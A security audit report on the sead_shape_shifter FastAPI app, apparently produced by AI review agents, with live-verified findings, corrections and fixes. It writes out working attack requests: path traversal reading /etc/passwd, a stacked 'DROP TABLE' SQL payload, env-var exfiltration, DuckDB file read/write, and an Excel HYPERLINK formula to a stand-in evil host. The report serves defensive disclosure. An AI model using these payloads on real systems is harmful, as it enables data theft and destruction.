# Found Errors — sead_shape_shifter (main @ 961589d5, re-verified on dev @ f85fad0c)

Findings from a 4-agent review panel (reuse / security / packaging / usability)
followed by a 3-agent verification pass (positive / neutral / hostile red-team).
Every finding below was re-verified against the code by at least one independent
agent; panel errors caught during verification are marked ~~struck through~~.
**Development happens on `dev`, not `main`** — see the dev re-verification
section below: all live-tested findings were re-run on dev and hold, plus one
new live-verified security finding and a batch of new correctness bugs.

Reading guide: the top sections are the verification record; the findings
themselves are defined in the Tier sections near the end. IDs: `1.x`/`2.x`/`3.x`
= findings, `N-x` = new findings from practical testing, `R-x`/`S-x`/`P-x` =
corrections/strengthenings/preconditions from the claim review, `D-x` =
dev-branch findings.

Status: **unfixed** — this document is a report, not a patch.

---

## Practical Verification (2026-09-02)

The backend was run locally (`pip install -e ".[api"]`, uvicorn on **127.0.0.1 only**,
scratch Postgres 17 in the same container) and every testable finding was
exploited for real. No real SEAD database was used or needed — except for the
ingester's deep paths, see 1.5.

| # | Finding | Verdict |
|---|---------|---------|
| 1.1 | Arbitrary file read | **VERIFIED** — `/etc/passwd` served by one unauthenticated GET |
| 1.2 | Arbitrary file write | **VERIFIED** — workflow output written to attacker-chosen dir outside sandbox |
| 1.3 | Multi-statement SQL bypass | **VERIFIED** — `DROP TABLE` executed on scratch Postgres via the "SELECT-only" endpoint |
| 1.4 | Env-var exfiltration | **VERIFIED** — env var value returned verbatim in HTTP response |
| 1.5 | Ingester endpoints | **PARTIAL** — attacker-chosen DB connection proven; file read/write needs a real SEAD clearing-house DB. See new finding N3: the API is dead at runtime anyway |
| 2.1 | `@include:`/`@load:` file read | **VERIFIED** — absolute-path `@load:` content appears in executed output |
| 2.2 | Excel formula injection | **VERIFIED** — live formula (`data_type='f'`) in dispatched xlsx |
| 2.4 | CORS wildcard | **VERIFIED** — three attacker origins echoed with `allow-credentials: true` |

### Evidence

**1.1** — `GET /api/v1/projects/ss_pwned/execute/download?target=/etc/passwd`
returned the file contents (no auth, no prior execution needed). Also read
`shared/data-sources/exfil.yml` the same way.

**1.2** — `POST /api/v1/projects/ss_pwned/execute`
`{"dispatcher_key":"csv","target":"/tmp/ss_pwned_out/evil_output.csv"}`
→ `success: true`; created `/tmp/ss_pwned_out/evil_output.csv/` and wrote
`note.csv` + `table_shapes.tsv` into it. Target fully attacker-controlled.

**1.3** — Against scratch Postgres (table `sacrificial`, 1 row):
- `POST /data-sources/scratch-pg/query/validate`
  `{"query":"SELECT 1 limit 1; DROP TABLE sacrificial"}` → `is_valid: true`,
  warning: *"Only the first will be executed"* (false).
- `POST /data-sources/scratch-pg/query/execute` with the same payload →
  returned the SELECT result rows; `information_schema` count for
  `sacrificial` went **1 → 0**. Table dropped.
- Note: the naive payload `SELECT 1; DROP TABLE x` is accidentally defeated
  by `inject_limit` (appends `limit 100` to the *whole* string → syntax
  error); embedding `limit` anywhere in the query disables the injection
  (see N2) and the stacked query goes through.
- The sqlite driver rejects multi-statement execution, so the bypass is
  live on postgres (the real deployment target).

**1.4** — Backend env `SS_SECRET_HOST=topsecret-value-12345`; data source
`exfil.yml` with `host: ${SS_SECRET_HOST}`.
`POST /data-sources/exfil/test` →
`"Connection failed: (psycopg.OperationalError) failed to resolve host
'topsecret-value-12345' ..."` — **the env var value in the HTTP response**.
No database involved; the DNS failure is the exploit.

**1.5** — `POST /api/v1/ingesters/sead/validate` with
`config.database = {host: 127.0.0.1, dbname: scratch, user: attacker}`
connected the ingester to the **attacker-chosen scratch database** (proven:
it queried my scratch DB for SEAD metadata) — via the lifespan-patch harness
that initializes the config store (see N3). It then stopped at
`clearing_house.clearinghouse_import_tables` — SEAD clearing-house metadata
that is **not in the shipped DDL** (`docs/sead/`), so the file-read and
DB-write halves could not be demonstrated without a real SEAD instance.
Code-level confirmation stands: `Submission.load(source=str(excel_file))`
with the request path, DB URI built from the request (`ingester.py:47-53`).

**2.1** — Project with `values: "@load: /tmp/ss_load_proof.csv"` executed
successfully; output `loaded.csv` contained the file's rows
(`LOAD-SECRET-ROW-1/2`). First attempt's error message ("externally loaded
rows missing columns ['system_id']") already proved the read. Combined with
1.1/1.2 this is a full arbitrary-CSV-read chain through the public API.

**2.2** — `fixed` entity value
`=HYPERLINK("http://evil.example/steal?d=note","looks fine")` dispatched via
`dispatcher_key: xlsx`; openpyxl inspection of the output:
`LIVE FORMULA at C3: data_type='f'`.

**2.4** — Preflight responses echoing attacker origins with
`access-control-allow-credentials: true`:
- `https://evil-attacker-5173.euw.devtunnels.ms` (any tunnel name/port)
- `https://evil-9999.zzz.devtunnels.ms` (any region via the `[a-z]+` fallback)
- `https://attacker-user.preview.app.github.dev` (any GitHub user)
(`http://` origins are rejected — the regex requires `https://`.)

### New findings from practical testing

**N1 — Postgres data sources cannot carry a password.**
`PostgresSqlLoader.db_opts` (`src/loaders/sql_loaders.py:516-524`) extracts
host/port/user/dbname and **silently drops `password`** — connections fail
with `fe_sendauth: no password supplied` unless the server uses trust auth
or PGPASSFILE. The `password` field is declared in the driver metadata
(`:509`) but never used.

**N2 — `inject_limit` appends to the whole string, not the first statement.**
`sql_loaders.py:249-256` does `f"{sql.strip().rstrip(';')} limit {limit};"` on the
raw multi-statement string, producing `SELECT 1; DROP TABLE x limit 100;`.
Accidentally blocks the naive stacked payload (syntax error) but is trivially
defeated by embedding `limit` anywhere (see 1.3). Both behaviors indicate the
string is treated as one unit — the entire string is what gets executed.

**N3 — The ingester API is dead at runtime.**
`setup_config_store` (`src/configuration/setup.py:15`) is exported but
**called from nowhere** — not the API lifespan (`main.py:24-60` says
"configurations loaded on-demand via sessions", which the ingester path does
not do), not the CLI, not the ingest script. Every
`POST /ingesters/{key}/validate|ingest` request fails with
`Config context 'default' not properly initialized` before touching any file
or database. (Verified: reproduced on a clean instance; a test harness that
patches the lifespan to call `setup_config_store` gets the ingester running,
at which point it connects to the attacker-chosen DB — see 1.5.)

### Not practically verifiable here

- **1.5 file read / DB write halves** — need a real SEAD clearing-house
  database (the only item on the list that does).
- **1.6 SQL identifier interpolation** — code inspection only; exploitation
  needs a controlled data source and crafted table names, and the chain is
  subsumed by 1.3/1.4.
- **2.3 UCanAccess supply chain** — the download step was not re-run against
  live SourceForge; the `cp /tmp/ucanaccess.zip` bug is confirmed by code
  inspection (wget writes to the `mktemp -d` dir, so on a clean machine
  `set -e` aborts).
- **3.x hygiene items** — confirmed by code inspection in the original panel;
  no runtime test needed or run.

### Test artifacts (left in place for re-verification)

- `projects/ss_pwned/`, `projects/ss_load/`, `projects/ss_internal/` — test
  projects (fixed entities / `@load:` / `@internal` DuckDB)
- `projects/ss_pos_*`, `projects/ss_attk*`, `projects/ss_cnt`, `projects/ss_zero`,
  `projects/ss_d23*` — extra test projects left by the review agents (harmless,
  deletable)
- `shared/data-sources/exfil.yml`, `scratch-sqlite.yml`, `scratch-pg.yml`
- `shared/shared-data/scratch.db` — sqlite scratch db
- Scratch Postgres 17 in-container: db `scratch`, user `attacker` (trust auth
  on 127.0.0.1); table `sacrificial` was dropped during the 1.3 tests —
  recreate with:
  ```sql
  CREATE TABLE sacrificial (id serial primary key, name text);
  INSERT INTO sacrificial (name) VALUES ('do me a disfavor');
  ```
- `/tmp/ss_load_proof.csv`, `/tmp/ss_secret.xlsx`, `/tmp/ss_secret_include.yml` —
  marker files for the 2.1 / 1.5 / D1 tests (recreate if the container was
  reset; contents are in the evidence sections above)
- `/tmp/ss_test_app.py`, `/tmp/ss_test_config.yml` — lifespan-patch harness
  used for the 1.5 partial verification (main-branch era; the ingester was
  rewired on dev — see the Dev table, 1.5 row)
- All test servers were stopped after testing; nothing was ever bound to 0.0.0.0

### Reproduce from zero (for a fresh machine/container)

```bash
# 1. System deps (Debian/Ubuntu, as root)
apt-get update && apt-get install -y python3.13-venv libpq5 default-jre-headless postgresql
service postgresql start
su postgres -c "psql -c \"CREATE USER attacker WITH PASSWORD 'att123';\""
su postgres -c "createdb -O attacker scratch"
# (for 1.3) create the sacrificial table as above; set 127.0.0.1 to trust
# auth in pg_hba.conf — required, the app cannot send passwords (see N1)

# 2. Python env (repo root; these steps reproduce the DEV tests — for main,
# drop the duckdb install)
python3 -m venv .venv-test
.venv-test/bin/pip install -e ".[api]" duckdb   # duckdb is dev-only, not in main's deps

# 3. Fixtures (if missing): recreate projects/ss_pwned, projects/ss_load,
# projects/ss_internal, shared/data-sources/*.yml and the /tmp marker files —
# every file's exact content is shown in the evidence sections above.

# 4. Backend — ALWAYS localhost-only (the app is unauthenticated and vulnerable)
SS_SECRET_HOST=topsecret-value-12345 \
  nohup .venv-test/bin/python -m uvicorn backend.app.main:app \
  --host 127.0.0.1 --port 8013 > /tmp/ss_backend.log 2>&1 &

# 5. Run the tests — the exact requests/responses for each finding are in the
# evidence sections. Kill with: pkill -f 'uvicorn backend.app[.]main'
```

## Running your own agent review (the workflow that produced this doc)

The findings were produced and stress-tested with parallel general-purpose
subagents. The pattern that worked, if you want to re-run it:

1. **Panel round** — 4 agents with distinct review axes (reuse, security,
   packaging, usability), each given only "review the code in <path>".
2. **Verification round** — 3 agents with different priors over the same
   findings list: *positive* (benefit of the doubt, calibrate overstatements),
   *neutral* (confirm/refute with evidence), *hostile* (assume the worst
   deployment, try to break the claims). The union of findings is strictly
   larger and more accurate than any single pass; the R1–R6 corrections
   (main round) and the D2/D3 corrections (dev round) each came from a
   separate 3-agent verification pass.
3. **Operational rules that matter** (each one cost real time when ignored):
   - Give each parallel agent its **own port** (8015/8016/8017 worked) —
     they will otherwise collide on the backend.
   - Kill uvicorn with `pkill -f 'uvicorn backend.app[.]main'` — the bracket
     prevents pkill from matching the agent's own shell (a plain pattern kills
     the agent's bash and returns no output).
   - The app **caches projects in memory** — after editing any project YAML,
     restart the backend or the stale version is used (this masked the D1
     test for a while).
   - JPype JVM startup **intermittently SIGSEGVs** in some containers
     (pre-existing `hs_err_*` files) — a backend restart may need a retry.
   - Tell agents the scratch Postgres is **read-only** (no dropping tables)
     unless a specific test needs it, or parallel agents will race on it.
   - Claims survive the hostile round only with test output or file:line
     evidence — "unlikely" is not an argument.

---

## Adversarial Claim Review (2026-09-02)

The worst-case / most-likely narrative built on the findings above was reviewed
by three independent agents (positive / neutral / hostile) against the code.
Core conclusions held; several specific claims were corrected. This section is
the authoritative correction record.

### Corrections (claims that did not hold as stated)

**R1 — db-dispatch exfiltration mechanism (was: "create a data source
pointing at the attacker's Postgres, execute with `dispatcher_key: db`").**
`DatabaseDispatcher` ignores the request `target` and writes to
`options.dispatch.database` **in the project YAML** (`src/dispatch.py:261-273`).
Working chain: unauthenticated `PUT /projects/{name}/raw-yaml` sets
`dispatch.database` to the attacker's PG → execute → `to_sql` writes there.
Also: the destination host is never logged, and `create_db_uri` builds a
passwordless URI (see N1), so the attacker's PG needs trust auth (trivial —
it's their server). Capability real, original wiring wrong.

**R2 — "file write clobbers another project's `shapeshifter.yml`" (persistence).**
No dispatcher can produce a file named `shapeshifter.yml`: csv forces
`{entity}.csv`, xlsx/openpyxl append a timestamp ("to avoid overwriting
existing files", `execute_service.py:212-240`), zipcsv forces `.zip`.
The persistence outcome is instead achieved directly by unauthenticated
`PUT /projects/{name}/raw-yaml`, which writes verbatim to any existing
project's `shapeshifter.yml` (`projects.py:549-563`). (Not live-tested; code
is unambiguous.)

**R3 — "env exfil yields OPENAI_API_KEY → lateral movement".**
`OPENAI_API_KEY` appears only in a CI release-notes script and a test fixture,
not in the backend's environment. The concrete exfil-able credential in this
deployment is the **`.pgpass` mount** (`docker/docker-compose.yml:45-46`) —
which grants a DB the attacker can already reach through the app. The exfil
*mechanism* is verified (1.4); what it yields depends on the deployment's env.

**R4 — "devtunnel URLs ⇒ production is on the public internet".**
Weakened to: the CORS defaults prove a *developer* developed through an Azure
DevTunnel (tunnel IDs are auto-generated); the deployment path is docker on a
shared server, with no tunnel involved. Tunnel names are 8 random chars
(~10¹² space, no enumeration API) — "whoever scans the tunnel name" is
infeasible. CORS is a browser-only mechanism and irrelevant to non-browser
attackers. What survives: the allowlist is dangerously broad (verified in 2.4),
which becomes a live hole only once auth + cookies exist — a fix-#1 companion,
not a threat-model changer.

**R5 — "theft is deniable".** Overstated. Uvicorn access logs record client
IP + path + status + time for every request (10 MB × 3 rotation). The
*content* (SQL text, row counts) is logged nowhere and the traffic is
indistinguishable from normal UI use (the frontend calls the same endpoint),
but the theft is attributable to an IP and time. **Unnoticeable: yes.
Deniable: no.**

**R6 — "auth on the router is the single fix".** Calibrated: auth must be at
the **FastAPI app level**, not nginx — compose publishes :8012 directly on all
interfaces and the app binds 0.0.0.0, so nginx-only auth is bypassable. And
`/api/v1/docs` / `openapi.json` are app-level routes **outside** `api_router`
(`main.py:68-70`), so gating them needs `docs_url=None` or app-level
middleware in the same change. Auth is the keystone, not the whole story —
the SQL guard (fix #2) is still required to stop an *authenticated* user from
running the stacked `DROP`.

### Strengthenings (findings that got worse under review)

- **S1 — the 10,000-row cap is on the `limit` parameter, not the query text.**
  `inject_limit` is a no-op whenever the query contains "limit" (see N2), so
  `SELECT * FROM t LIMIT 999999999` returns a whole table in one request.
  Real ceilings: 300 s timeout and server RAM.
- **S2 — `POST /data-sources/tables` accepts an inline connection config**
  (`endpoints/schema.py:63`) — schema introspection against *any* reachable
  DB, no pre-existing data source needed.
- **S3 — the repo's own `docs/` are also mounted publicly**
  (`main.py:127-131`), unauthenticated.

### Unstated preconditions (now stated)

- **P1 — Production DB write privileges.** The destruction/tamper paths (1.3,
  db dispatch) fail at a permission error if the production SEAD user is
  read-only. Nothing in the repo shows the grants; verify before ranking
  these as worst-case.
- **P2 — A production data source existing in the deployment.** "Zero setup"
  exfil assumes the deployed app already holds the SEAD data source. The repo
  ships none; otherwise setup is one unauthenticated `POST /data-sources`
  (credentials harvestable from the readable `.pgpass` — still trivial).

### What held under all three review angles

Query-endpoint exfiltration channel (with S1/S2), stacked-query destruction
(with P1), public Swagger + public docs mount, theft indistinguishable from UI
traffic (SQL text logged nowhere), and the absence of any monitoring or
alerting in the repo.

---

## Dev Branch Re-Verification & New Dev Findings (2026-09-02, dev @ f85fad0c)

Development happens on `dev` (266 code files diverged from main, +22k lines —
feature work, not security fixes). The backend was re-run on dev and every
live test re-executed.

### Main findings on dev: all still valid

| Finding | Dev status | Evidence |
|---|---|---|
| 1.1 File read | **Re-verified live** | `execute.py`/`execute_service.py` byte-identical to main; `/etc/passwd` served again |
| 1.2 File write | **Re-verified live** | unchanged; output written to `/tmp/ss_pwned_out2/` again |
| 1.3 Stacked SQL DROP | **Re-verified live** | `query_service.py` still checks only `parsed[0]` (:67), still executes the whole string (:132-134); sacrificial table dropped again (1→0) |
| 1.4 Env-var exfil | **Re-verified live** | `data_source_service.py:267` still returns `str(e)`; secret echoed again. Bonus: global exception handler also echoes `str(exc)` (`main.py:95-101`) |
| 2.1 `@load:`/`@include:` read | **Re-verified live** | resolvers moved to `src/configuration/resolve.py` but absolute paths still pass through unchanged (`resolve.py:302,315`); file content in output again |
| 2.2 Formula injection | **Re-verified live** | `dispatch.py` change is signature-only; live formula at C3 again |
| 2.4 CORS | **Re-verified live** | regex byte-identical (`core/config.py:49-50`); attacker origin echoed again |
| N1 password dropped | **Still valid** | `db_opts` unchanged (`sql_loaders.py:514-523`), `create_db_uri` still has no password param |
| N2 inject_limit whole-string | **Still valid** | byte-identical (`sql_loaders.py:249-256`) |
| No auth / public Swagger / raw-yaml | **Still valid** | no auth added anywhere; `/api/v1/docs` + static `docs/` mount still public; raw-yaml still writes verbatim (`projects.py:568`) |
| 1.5 Ingester API | **Still dead at runtime** | dev deleted `setup.py` and rewired the service layer to pydantic settings, but the ingester's own code still calls `ConfigValue(...).resolve()` throughout (`ingesters/sead/metadata.py:255`, `policies.py:47+`) and nothing in the API initializes the store — every request still fails with "Config context 'default' not properly initialized" (re-tested live). The code-level risks (attacker-chosen DB URI, arbitrary `source` path) remain real the moment the config dependency is fixed |
| 2.3 UCanAccess script | **Still valid** | `install-uncanccess.sh` unchanged |
| 1.6 SQL identifier interpolation | **Still valid** | f-string interpolation unchanged on dev (code-verified) |
| Tier 3 hygiene (3.1–3.10) | **Still valid** | all still present on dev (code-verified) |

### D1 — NEW (dev-only), live-verified: `@internal` DuckDB arbitrary file read/write + probing oracle

dev adds a virtual `@internal` data source backed by in-memory DuckDB
(`src/loaders/duckdb_loader/`). A project entity with `type: sql` +
`data_source: "@internal"` executes arbitrary DuckDB SQL server-side during
`POST /api/v1/projects/{name}/execute` — and DuckDB table functions read
arbitrary local files:

- **Live-verified:** a project with
  `query: "SELECT column0 AS proof_col FROM read_csv_auto('/etc/passwd', header=false)"`
  executed successfully; `/tmp/ss_internal_out/leaked.csv` contained full
  `/etc/passwd` lines (`root:x:0:0:root:...`). Re-reproduced independently by
  three review agents on separate backend instances.
- **Also live-verified: arbitrary file WRITE** — the same unguarded path
  executes `COPY (SELECT 'pwned') TO '/tmp/...'`; the file landed even though
  the workflow then "failed" at a later column check. Binary reads work too
  (`read_blob('/usr/bin/true')` returned the exact byte size) — not limited to
  CSV-parseable files. Only precondition: readable by the process user.
- The direct-query endpoint is guarded (`POST /data-sources/@internal/query/execute`
  → 400 "cannot be queried directly"), but the **execute path has no guard at
  all** — the pipeline never calls `QueryService.validate_query`, so even the
  new `SELECT *` restriction doesn't apply.
- `glob()` works → path enumeration (`/etc/pass*` listed both files); all
  DuckDB file functions available (`read_csv`, `read_json`, `read_parquet`,
  `read_text`, `read_blob`, `glob`, ...).
- DuckDB `Binder Error`s are returned verbatim in API responses, exposing the
  full SQL and candidate column bindings — schema probing oracle.

### D2 — New correctness bugs on dev (top 3 live-reproduced)

1. **[HIGH, reproduced] Silent leading-zero corruption.**
   `ExtraColumnEvaluator.coerce_string_constant_literal`
   (`src/transforms/extra_columns.py:391`) converts numeric-looking string
   constants: `"007"` → `int 7`, `" 12 "` → `int 12`. Any `extra_columns`
   constant that is a code (zip/region/sample codes) is silently corrupted in
   the output. Related: `_coerce_compatible_merge_key_dtypes`
   (`src/transforms/utility.py:110-152`) coerces join keys the same way —
   `"007"` joins against `7` and the merged row carries `7`.
2. **[MEDIUM, reproduced — impact corrected by review] `COUNT(*)` wildcard
   false positive.** `has_wildcard_select` (`backend/app/utils/sql.py:24-44`)
   cannot distinguish `t.*` from `COUNT(*)`: `SELECT COUNT(*) FROM t` →
   `True`. **But the documented impact was overstated:** the check only runs in
   `validate_query`/`extract_select_columns` — the execute path never calls
   it, so aggregate queries through the actual feature **succeed** (live:
   `SELECT COUNT(*) AS n FROM read_csv_auto(...)` returned n=24). The false
   positive only misfires on the advisory `/query/validate` and `/query/columns`
   endpoints for `@internal` (where it rejects `COUNT(*)` with "SELECT * is
   not allowed"), and `/query/execute` is 400 for `@internal` anyway. Real
   minor parser bug in a UI helper, not a broken feature.
3. **[MEDIUM, reproduced — scope narrowed by review] Missing `@include` file
   makes target-model conformance report VALID.**
   `validate_target_model` (`backend/app/services/validation_service.py:263-268`)
   catches `FileNotFoundError` from `ProjectMapper.to_core` — which resolves
   ALL `@include:` directives in the project — and returns `is_valid=True`
   (confirmed with an A/B control: same project valid-with-file → invalid,
   missing-file → valid). **Corrections from review:** (a) the main `/validate`
   endpoint still catches this with a clear `CONFIG_INCLUDE_NOT_FOUND` error —
   only the conformance endpoint silently reports valid; (b) the `@load:` half
   is wrong — `LoadResolver` uses `raise_if_missing=False` and degrades to the
   raw string (`resolve.py:459-466`), so a missing `@load:` file never raises
   `FileNotFoundError`. Residual bug: conformance silently *skipped* when an
   unrelated `@include` is missing.

### D3 — Further dev-only correctness findings (reviewed; statuses after 3-agent test pass)

- (a) `src/normalizer.py` `_apply_mapping_sidecar_links`: a committed link with
  `target_id=None` replaces `public_id` with None → **reproduced** (public_id
  → NaN; int `target_id=42` also upcasts a string public_id column to
  float64). **Caveat from review:** every programmatic commit path guards
  against None (API requires int, reconciliation skips None, materialization
  rejects) — only a **hand-edited sidecar YAML** triggers it.
- (b) `src/process_state.py:19` (line drifted from the original 29-31): target
  entities missing from project config are silently filtered out (main raised
  KeyError) — **reproduced**. **Caveat from review:** the main workflow never
  passes `target_entities` (filter is a no-op there); preview 404s on missing
  entities first; the filter only bites for FK refs to undefined entities —
  close to the documented intent.
- (c) `src/target_model/data_validators.py:14-23`: case-sensitive dtype substring
  check flags `Int64`/`Float64` (nullable dtypes this codebase itself
  produces) as `TYPE_INCOMPATIBLE` against declared `integer`/`float` —
  **reproduced**; severity is a warning, not an error.
- (d) `src/transforms/branch.py:33-46`: two merged-entity branches sharing a
  `public_id` (or colliding with a `{source}_id` fallback) → later branch
  overwrites the earlier branch's FK column with NA — **reproduced**.
- (e) `src/transforms/dsl.py` `_fn_to_int`: `int(5.9)` → 5 silent truncation
  (while `int("5.9")` errors — inconsistent). Code-reviewed only.
- (f) `options.mappings` is now a **no-op** (deprecated with warning) — existing
  projects silently stop mapping on upgrade. **Review:** confirmed —
  `map_to_remote` has zero production callers (a test asserts it isn't called).
- (g) ~~`src/loaders/fixed_loader.py:34-39`: dict path yields all-None columns for
  misnamed CSV headers instead of a missing-column error.~~ — **REFUTED by
  test:** misnamed CSV headers raise `ValueError: ... externally loaded rows
  missing columns [...]` via `FixedEntityFieldsSpecification` before the dict
  path is reached; CSV `@load:` resolves to list-of-dicts, which is the path
  actually exercised.
- (h) Stale generated doc: `tests/target_model/test_schema_reference.py::test_committed_reference_is_in_sync`
  **fails on dev** (re-run by two independent agents; regenerate via
  `scripts/generate_target_model_schema_reference.py`).

### D4 — Unauthenticated data-source config leak (main and dev)

`GET /api/v1/data-sources` lists the **global/shared** data-source configs
without auth (including env-var placeholders like `${SS_SECRET_HOST}` and, in
our local test instance, a plaintext password and absolute file paths). The
endpoint exists unchanged on main; documented here because it was found
during the dev round.

### Review-round note (3-agent hostile/neutral/positive test pass)

All three agents independently re-reproduced D1 (including `/etc/passwd`),
D2.1 end-to-end, D2.3, D3(a), D3(b), and the stale-doc test, and all three
re-confirmed the main-branch findings still hold on dev (hostile agent
live-re-ran 1.1/1.2/1.3/1.4/2.1/2.2/2.4). Corrections absorbed above: D2.2
impact, D2.3 scope, D3(a) reachability, D3(b) lines/reachability, D3(g)
refuted. (Environment note: JPype JVM startup intermittently SIGSEGVs in this
container — see the operational rules above.)

### Environment note

dev requires the new `duckdb` dependency (not in main's install). Test venv
was updated accordingly. All dev testing used the same localhost-only binding
and scratch Postgres; the sacrificial table was dropped again during the 1.3
re-run.

---

## Tier 1 — Exploitable with a single unauthenticated request

The root cause for most of Tier 1 is the same: **the FastAPI app has no
authentication or authorization at all**, binds `0.0.0.0`, and
`docker-compose.yml` publishes the port on all interfaces.
(`require_session` in `backend/app/api/dependencies.py:79` is a UI
project-session, not auth — anyone can `POST /api/v1/sessions`.)

### 1.1 Unauthenticated arbitrary file READ
`backend/app/api/v1/endpoints/execute.py:78-96` —
`GET /api/v1/projects/{name}/execute/download?target=<any path>` takes a
free-form path, checks only `is_file()`, and serves it via `FileResponse`.
No auth, no confinement to an output dir, follows symlinks.
`docker/docker-compose.yml:47` mounts `.pgpass` into the container, so this
exfiltrates Postgres credentials.
**Fix:** resolve + `is_relative_to()` against the known output dir (pattern
already exists in `data_source_service.py:35` and `help_docs.py:28`).

### 1.2 Unauthenticated arbitrary file WRITE
`POST /api/v1/projects/{name}/execute` takes a free-form `target`;
`backend/app/services/execute_service.py:178-200` resolves any absolute path
and `mkdir(parents=True)`s it, then dispatchers write output there as the
service user. Can clobber other projects' `shapeshifter.yml` (persistence)
or poison `shared/shared-data/`.

### 1.3 Multi-statement SQL bypass (found independently by two verification agents)
`backend/app/services/query_service.py:57` validates only `parsed[0]`;
additional statements produce a *warning*, not an error (`:87-89`), and
`:136-138` passes the **entire raw string** to `loader.read_sql`.
`SELECT 1; DROP TABLE x` validates and executes on the connected database.
`introspect_query_columns` (`:253`) is identical.
**Fix:** reject `len(parsed) > 1` (five-line guard).

### 1.4 Env-var exfiltration via data-source test
`POST /api/v1/data-sources` accepts any host/port/user;
`POST /api/v1/data-sources/{f}/test` expands `${ANY_ENV_VAR}` from the server
process (`src/utility.py:505+`) and the failure path returns `str(e)` to the
client (`data_source_service.py:254`). psycopg error text echoes the host,
so **the value of any server env var (DB passwords, API keys) is returned in
the HTTP response**. Also a blind port-scan / internal-reachability oracle
(169.254.169.254, 10.x).

### 1.5 Ingester endpoints: second unauthenticated appliance
`POST /api/v1/ingesters/sead/ingest` (`ingesters.py:41-66`): `source` is an
arbitrary server path; `config.database.{host,port,user,dbname}` builds a
direct Postgres URI (SSRF + writes into staging/public tables via
`register`/`explode`); `output_folder` is joined verbatim into the output
path (`process.py:49-51`) → arbitrary file write.
`POST /api/v1/ingesters/sead/validate` gives the file-read half.

### 1.6 SQL identifier interpolation (partially quoted)
`src/loaders/sql_loaders.py:408` — `WHERE TABLE_NAME = '{table_name}'`
(string-literal injection); `:553/:570/:584` unquoted
information_schema queries; `:239` uses `quote_name` but does not escape
embedded `"`. `backend/app/services/schema_service.py:305` — unquoted
`FROM {table_name}`. Trust boundary is project YAML, but the API writes
project YAML unauthenticated (see 1.2 / 2.1), so the chain is live.
**Fix:** shared identifier-quoting helper / `^[A-Za-z0-9_.$]+$` validation.

## Tier 2 — Real, needs a chain or a specific victim

### 2.1 Second file-read vector: `@include:` / `@load:` absolute paths
`PUT /api/v1/projects/{name}/raw-yaml` writes arbitrary YAML;
`SubConfigResolver` (`src/configuration/config.py:419-439`) supports
`@include: /abs/path/config.yml` and `@load:` reads CSVs from arbitrary
paths. Resolved values surface in execute/preview error messages
(`execute_service.py:141-146` returns `str(e)`), so other data-source YAMLs
containing credentials can be pulled into a project and echoed back.

### 2.2 Excel formula injection in xlsx dispatch
openpyxl stores any string starting with `=` as a live formula.
`ExcelDispatcher` (`src/dispatch.py:68-75`) and `OpenpyxlExcelDispatcher`
(`:145`) write raw values; `calcMode="manual"` does not stop recalc on open.
Upload a CSV containing `=HYPERLINK("http://evil/?"+A1,"x")` via
`POST /api/v1/data-sources/files` (`data_sources.py:118-131`), point a
project at it, execute → every colleague who opens the output xlsx triggers
it.

### 2.3 Unpinned UCanAccess download, baked into the image — and the script is broken
`scripts/install-uncanccess.sh`: `wget` from SourceForge `latest/download`
(unpinned, no checksum), jar baked into the image via `docker/Dockerfile:64,74,181`.
Additionally `cp /tmp/ucanaccess.zip "${tmp_dir}"` copies a hardcoded path —
`wget -O` wrote into the `mktemp -d` dir, so on a clean machine `set -e`
aborts the install; if a stale file exists at `/tmp/ucanaccess.zip` it
silently wins.
**Fix:** pin a release URL + SHA-256, fix the `cp`.

### 2.4 CORS: any `*.devtunnels.ms` / `*.preview.app.github.dev` with credentials
`backend/app/core/config.py:37-48` — personal devtunnel URLs in defaults;
the regex's trailing `[a-z]+` alternative makes the region list moot.
`backend/app/main.py:116-122` sets `allow_credentials=True`.
Low impact *while there is no auth* (no cookies to steal) — but the moment
auth is added (Tier 1 fix), this silently becomes a real hole.
**Fix in the same PR as auth.**

## Tier 3 — Hygiene, brittle, or latent correctness

### 3.1 Personal machine state committed
`/home/sead/...` and `/home/roger/source/...` hardcoded in
`docker/Makefile:7,10`, `docker/rsync-to-sead-tools`,
`docker/deploy-to-sead-tools`; personal devtunnel URLs in CORS defaults.
Leaks host layout; deploy scripts break on the next machine.

### 3.2 Port mismatch — broken out of the box
`Makefile:3` `BACKEND_PORT ?= 8013`; `frontend/src/api/client.ts:54`
defaults `VITE_API_BASE_URL` to `http://localhost:8012`; `AGENTS.md:13,383`
say 8012; docker uses 8012. No `frontend/.env`. The Vite proxy targets 8013
but axios uses the absolute URL, so the proxy is bypassed —
`make backend-run` + `make frontend-run` does not work as documented.

### 3.3 `src/__int__.py` — typo'd `__init__.py`
0-byte file; `src` is silently a PEP 420 namespace package. Imports work,
so nothing alerts you until a non-namespace-tolerant tool chokes.

### 3.4 `src/configuration/provider.py:150` — hardcoded context
`configure_context` does `self.set_config(context="context", cfg=source)` —
stores under the literal string `"context"`, ignoring the parameter
(the else-branch at `:159` uses it correctly). Latent: only pre-loaded
`Config` objects hit the bug; current callers pass str sources.
**Correctness bug** — in a data pipeline, "silently wrong config context"
is the worst failure class; needs a test to determine if it is live.

### 3.5 Makefile / docker build bugs
- `Makefile:212-214` — `frontend-build` runs `pnpm dev` (blocking dev
  server), produces no build.
- ~~`kill` target defined twice, frontend never killed~~ — **REFUTED by
  verification**: `kill` is defined once (`Makefile:109`); what is duplicated
  is a `.PHONY: kill` line (`:108` and `:144`, the latter a leftover where
  `.PHONY: backend-kill` was intended). `make kill` does kill both.
- `docker/Makefile:132` — `docker-clean` has a mangled
  `|| true @echo \` line, and removes `shape-shifter:latest` while compose
  builds `shape-shifter:dev`.
- `docker/Makefile setup-permissions` — `@echo usermod -aG www-data ${USER}`
  prints the command instead of running it; group is never added.

### 3.6 `lib/` gitignored but required by the Dockerfile
`.gitignore:18` vs `docker/Dockerfile:64,74,181` `COPY lib/`. A fresh clone
builds an image that silently lacks MS Access support —
`sql_loaders.py:46` only logs a warning when no JARs are found.

### 3.7 Unpinned tooling
`npx @marp-team/marp-cli@latest` (`Makefile:360+`); `npm install -g
semantic-release` unpinned in `.github/workflows/release.yml:27` (an npm
publish attack could ride the release workflow); `pip install uv` unpinned
(`docker/Dockerfile:128`); `pnpm@9` major-pinned only.

### 3.8 CLI documentation lies (`src/shapeshift.py`)
- `--validate-then-exit` help says "exit **if invalid**" but the code always
  exits (`:62`); `validate_project` hardcodes `env_file=".env"`
  (`src/workflow.py:86`), silently ignoring `--env-file`.
- Docstring shows misspelled `shaper_shifter.py` and a wrong signature.
- `--project` is not `required=True` → raw `FileNotFoundError` traceback.
- `backend/app/scripts/ingest.py` docstring shows `list`, actual command is
  `list-ingesters`.
